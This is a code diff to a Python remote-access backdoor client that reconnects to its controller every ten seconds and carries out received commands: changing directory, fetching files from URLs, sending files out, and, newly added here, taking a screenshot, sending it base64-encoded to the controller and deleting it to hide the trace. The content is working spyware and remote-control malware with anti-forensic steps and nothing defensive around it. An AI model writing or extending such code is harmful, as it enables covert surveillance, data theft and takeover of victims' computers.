@@ -8,6 +8,8 @@ import base64
 import sys
 import time
 import requests
+from mss import mss
+
 
 def send_j(data):
     json_data = json.dumps(data)
@@ -30,6 +32,10 @@ def web_download(url):
     with open(file_name, "wb") as f:
         f.write(response.content)
 
+def screenshot():
+    with mss() as screenshot:
+        screenshot.shot()
+
 def connect():
     while True:
         time.sleep(10) #reconnect every 10 seconds
@@ -46,20 +52,31 @@ def shell():
 
         if cmd == "exit_client":
             break
+
         elif cmd[:2] == "cd" and len(cmd) > 2:
             try:
                 os.chdir(cmd[3:]) #change directory to what's after "cd"
             except:
                 continue
-        elif cmd[:12] == "wget":
-            url = cmd[13:]
 
+        elif cmd[:4] == "wget":
+            url = cmd[5:]
             try:
-
                 web_download(url)
                 send_j("File Downloaded successfully!")
             except:
                 send_j("Failed to download")
+
+        elif cmd[:10] == "screenshot":
+            try:
+                screenshot() #take screenshot and its always saved as monitor-1.png
+                with open("monitor-1.png","rb") as f:
+                    send_j(base64.b64encode(f.read()).decode('utf-8'))
+                    f.close()
+                os.remove("monitor-1.png") #remove screenshot to hiding artifact
+            except:
+                send_j("failed to take screenshot")
+
         elif cmd[:8] == "download":
             try:
                 with open(cmd[9:], "rb") as f:
@@ -93,5 +110,5 @@ if not os.path.exists(location):
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 connect()
-#conect
+
 s.close()
